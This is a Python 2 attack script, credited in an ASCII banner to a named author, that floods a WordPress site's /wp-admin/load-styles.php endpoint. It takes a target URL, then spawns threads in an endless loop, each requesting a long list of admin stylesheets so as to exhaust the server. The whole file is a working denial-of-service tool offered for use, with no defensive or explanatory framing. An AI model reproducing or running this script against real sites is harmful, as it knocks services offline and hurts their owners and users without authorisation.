import requests
import threading

print  """
path exploit : /wp-admin/load-styles.php
________          _________
\\______ \\   ____ /   _____/
 |    |  \\ /  _ \\\\_____  \\ 
 |    `   (  <_> )        \\
/_______  /\\____/_______  /
        \\/              \\/

Coded by : Akazh ID
Facebook : fb.com/justakazh
"""

def dos(url):
    try:
        head = {
            "User-Agent":"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/78.0.3904.70 Chrome/78.0.3904.70 Safari/537.36"
        }
        target = url+"/wp-admin/load-styles.php?c=0&load[]=about,admin-menu,code-editor,color-picker,common,customize-controls,customize-nav-menus,cuztomize-widgets,dashboard,deprecated-media,edit,farbtastic,forms,ie,install,l1on,list-tables,login,media,nav-menus,revisions,site-health,site-icon, themes,widgets,wp-admin,admin-bar,buttons,cuztomize-preview,dashicons,editor,jquery-ui-dialog,media-views,wp-auth-check,wp-embed-template,wp-pointer"
        req = requests.get(target, headers=head)
        res = req.text  

        if "window" in res:
            print "[+] SUCCESS load-styles.php ==> " + url
        else:
            print "[-] Failed ==> Maybe not Vuln or Server Down"
    except:
        pass

get = raw_input("Target >> ")
get.strip()
i = 0
while i == 0:
    try:

        t1 = threading.Thread(target=dos, args=(get,))
        t1.start()
    except:
        pass